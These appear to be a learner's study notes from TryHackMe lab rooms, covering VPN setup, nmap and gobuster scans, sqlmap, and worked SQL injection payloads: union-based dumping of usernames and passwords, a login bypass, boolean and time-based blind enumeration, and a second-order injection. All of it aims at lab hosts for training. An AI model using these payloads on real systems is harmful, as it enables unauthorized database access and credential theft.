https://www.kali.org/tools/


Connecting to Try Hack me with VPN
    https://tryhackme.com/r/access
    VPN is running from Kali Linux with the following steps:
        sudo apt update && sudo apt upgrade
    Run the following command in a terminal # Already installed in kali
        sudo apt install openvpn
    Download (https://tryhackme.com/vpn/get-config) the OpenVPN configuration
        file (you must be logged in at https://tryhackme.com/) a file with
        extension .ovpn with your user configuration is downloaded.
    Locate the previously downloaded setup file, you should usually find it in
        the Downloads folder: cd ~/Downloads

    Connect to the platform using OpenVPN with the following command:
        sudo openvpn file.ovpn
    Open a new console or connect using browser.
        curl 10.10.10.10/whoami

Using Attack machine in Try Hack Me
    https://tryhackme.com/my-machine

    1. Tools are located in /root/Desktop/Tools & /opt/
    2. Webshells are located in /usr/share/webshells
    3. Wordlists are located in /usr/share/wordlists
    4. READMEs are located in /root/Instructions
    5. To use Empire & Starkiller, read the following file:
        /root/Instructions/empire-starkiller.txt



********************************************************************************
                    https://tryhackme.com/r/room/sqlmap
********************************************************************************
open source penetration testing tool, automates the process of detecting and
exploiting SQL injection flaws and taking over database servers
    https://github.com/sqlmapproject/sqlmap

Start vmware with kli linux virtual machine
    Network adapter = NAT in configuration
    Use the Network adapter icon in vmware windows to connect internet
    Connect to tryhackme platform using OpenVPN with the following command:
        sudo openvpn file.ovpn
    Open a new console or connect using browser.
        curl 10.10.10.10/whoami

sqlmap -h | -hh
start the machine in: https://tryhackme.com/r/room/sqlmap
sqlmap -u <target ip addres>

sudo sed -i 's/non-free$/non-free non-free-firmware/' /etc/apt/sources.list   
sudo apt install gobuster
gobuster dir -u http://10.10.136.156



********************************************************************************
                https://tryhackme.com/r/room/furthernmap
********************************************************************************

nmap 10.10.80.176





********************************************************************************
                https://tryhackme.com/r/room/sqlinjectionlm
********************************************************************************

In-Band SQL Injection example
    refers to the same method of communication being used to
    exploit the vulnerability and also receive the results

    https://website.thm/blog?id=1
    SELECT * from blog where id=1 and private=0 LIMIT 1;

    https://website.thm/blog?id=2;--
    SELECT * from blog where id=2;-- and private=0 LIMIT 1;

    Error-Based SQL Injection
        For easily obtaining information about the database structure to break
            the code's SQL query by trying certain characters: ', ""
        Error message confirms the existence of an SQLi vulnerability.

    Union-Based SQL Injection
        Utilises the SQL UNION to return additional results, try until no error
        https://website.thm/article?id=1 UNION SELECT 1
        https://website.thm/article?id=1 UNION SELECT 1,2
        https://website.thm/article?id=1 UNION SELECT 1,2,3    -- no error
        -- So ommit result from the left side to get only the right side
        https://website.thm/article?id=0 UNION
            SELECT 1,2,DATABASE()
        https://website.thm/article?id=0 UNION 
            SELECT 1,2,group_concat(table_name)
            FROM information_schema.tables WHERE table_schema = 'sqli_one'
        https://website.thm/article?id=0 UNION 
            SELECT 1,2,group_concat(column_name)
            FROM information_schema.columns WHERE table_name = 'staff_users'
        https://website.thm/article?id=0 UNION 
            SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>')
            FROM staff_users
        pa$$word

Blind SQL Injection example
    When we get little to no feedback from injected queries

    Authentication Bypass
        https://website.thm/login
            select * from users
            where username='%username%' and password='%password%' LIMIT 1;
        USER    any
        PASS    ' OR 1=1;--
            select * from users
            where username='any' and password='pa$$word' or 1=1; --' LIMIT 1;

    Boolean Based
        Refers to the boolean response we receive from our injection
        Confirms that our SQL Injection payload was either successful or not
        
        https://website.thm/checkuser?username=admin
            select * from users where username = '%username%' LIMIT 1;
            -- this returns {"taken":true}

        https://website.thm/checkuser?username=admin123
            select * from users where username = '%username%' LIMIT 1;
            -- this returns {"taken":false}

        -- Try UNION until get the right number of columns
        https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3;--
            -- this returns {"taken":true}

        -- Try to find the database name iterating characters
        https://website.thm/checkuser?username=admin123' UNION
            SELECT 1,2,3 where database() like '%';--
            SELECT 1,2,3 where database() like 's%';--
            ...
            SELECT 1,2,3 where database() like 'sqli_three';--

        -- cycle through chars until a positive match for table_name
        https://website.thm/checkuser?username=admin123' UNION
            SELECT 1,2,3 FROM information_schema.tables
            WHERE table_schema = 'sqli_three'
            AND table_name like 'a%';--
            ...
            AND table_name like 'users';--

        -- cycle through chars until a positive match for COLUMN_NAME
        https://website.thm/checkuser?username=admin123' UNION
            SELECT 1,2,3 FROM information_schema.COLUMNS
            WHERE TABLE_SCHEMA='sqli_three'
            AND TABLE_NAME='users'
            AND COLUMN_NAME like 'a%';

        -- cycle through chars until find all/needed COLUMN_NAME
        https://website.thm/checkuser?username=admin123' UNION
            SELECT 1,2,3 FROM information_schema.COLUMNS
            WHERE TABLE_SCHEMA='sqli_three'
            AND TABLE_NAME='users'
            AND COLUMN_NAME !='id'
            AND COLUMN_NAME like 'a%';
        https://website.thm/checkuser?username=admin123' UNION
            SELECT 1,2,3 FROM information_schema.COLUMNS
            WHERE TABLE_SCHEMA='sqli_three'
            AND TABLE_NAME='users'
            AND COLUMN_NAME !='id'
            AND COLUMN_NAME !='username'
            AND COLUMN_NAME like 'password';

        -- cycle through chars until discover a valid username
        https://website.thm/checkuser?username=admin123' UNION
            SELECT 1,2,3 from users where username like 'a%';
            ...
            SELECT 1,2,3 from users where username like 'admin';

        -- cycle through chars until discover the password
        https://website.thm/checkuser?username=admin123' UNION
            SELECT 1,2,3 from users where username='admin'
            AND password like 'a%';
            ...
            AND password like '3845';

    Time-Based
        There is no visual indicator of wrong or right, instead,
        indicator of a correct query is based on the time the query takes.
        introduced delay using built-in methods SLEEP(x) alongside the UNION.
        SLEEP() will only ever get executed upon a successful UNION SELECT.

        https://website.thm/analytics?referrer=thm.com
            select * from analytics_referrers where domain='thm.com' LIMIT 1
            -- No delay

        -- cycle number of columns, no delay means the query was unsuccessful
        https://website.thm/analytics?referrer=admin123' UNION
            SELECT SLEEP(5);--
            ...
            SELECT SLEEP(5),2;--

        -- cycle to find table name, no delay means the query was unsuccessful
        https://website.thm/analytics?referrer=admin123' UNION
            SELECT SLEEP(5),2 where database() like 's%';--
            ...
            SELECT SLEEP(5),2 where database() like 'sql______';--

        -- cycle through chars until a positive match for table_name
        https://website.thm/analytics?referrer=admin123' UNION
            SELECT SLEEP(1),group_concat(table_name)
            FROM information_schema.tables
            WHERE table_schema = 'sql______'
            AND table_name like '%';--
            ...
            AND table_name like 'users';--

        -- cycle through chars until a positive match for COLUMN_NAME
        https://website.thm/analytics?referrer=admin123' UNION
            SELECT SLEEP(1),group_concat(TABLE_NAME)
            FROM information_schema.COLUMNS
            WHERE TABLE_SCHEMA='sql______'
            AND TABLE_NAME='users'
            AND COLUMN_NAME like '%';
            ...
            AND COLUMN_NAME like 'id';
            ...
            AND COLUMN_NAME like 'user';
            ...
            AND COLUMN_NAME like 'password';

        -- cycle through chars until discover a valid username
        https://website.thm/analytics?referrer=admin123' UNION
            SELECT SLEEP(1),2 from users where username like 'a%';
            ...
            SELECT SLEEP(1),2 from users where username like 'admin';

        -- cycle through chars until discover the password
        https://website.thm/analytics?referrer=admin123' UNION
            SELECT SLEEP(1),2 from users where username='admin'
            AND password like 'a%';
            ...
            AND password like '4961';
        THM{SQL_INJECTION_MASTER}

Out-of-band
    is classified by having two different communication channels, one to
    launch the attack and the other to gather the results. For example, the
    attack channel could be a web request, and the data gathering channel
    could be monitoring HTTP/DNS requests made to a service you control.



********************************************************************************
                https://tryhackme.com/r/room/advancedsqlinjection
********************************************************************************

Second-order SQL injection
    Traditional SQL Injection exploits real-time processing vulnerabilities,
    but this is when data previously stored in a db is later used in a query.
    Bypass typical frontend defences like basic input validation or sanitisation,
        which only occur at the point of initial data entry, not in others pages.
    Understanding how data flows through the application and is reused

    1. Insert/add new data, store payload in db without execution.
        http://10.10.237.72/second/add.php
            SSN = 12345'; UPDATE books SET book_name = 'Hacked'; --
                $ssn = $conn->real_escape_string($_POST['ssn']);

    2. The payload is in the database
        http://10.10.237.72/second/add.php
        +---------------------------------------------------+-----------+-------+
        | SSN                                               | BOOK NAME | AUTHOR|
        | 12345'; UPDATE books SET book_name = 'Hacked'; -- | Test      | Hacker|
        +---------------------------------------------------+-----------+-------+

    3. Use another internal query to to get payload with
        http://10.10.237.72/second/update.php
            updating for example BOOK NAME = anything,

            -- will replace original query
                UPDATE books SET
                    book_name = '$new_book_name',
                    author = '$new_author'
                WHERE ssn = '$ssn';

            -- by a new query with the payload
                UPDATE books SET
                    book_name = 'Testing',
                    author = 'Hacker'
                WHERE ssn = '12345';
                Update books SET
                    book_name ="hacked"; --'; INSERT INTO logs (page) VALUES ('update.php');


Filter evasion
    



    Out-of-band SQL Injection
    Automation techniques
    Mitigation measures




nmap -A -T4 -p 3306,3389,445,139,135 10.10.237.72

Target machine 10.10.237.72






















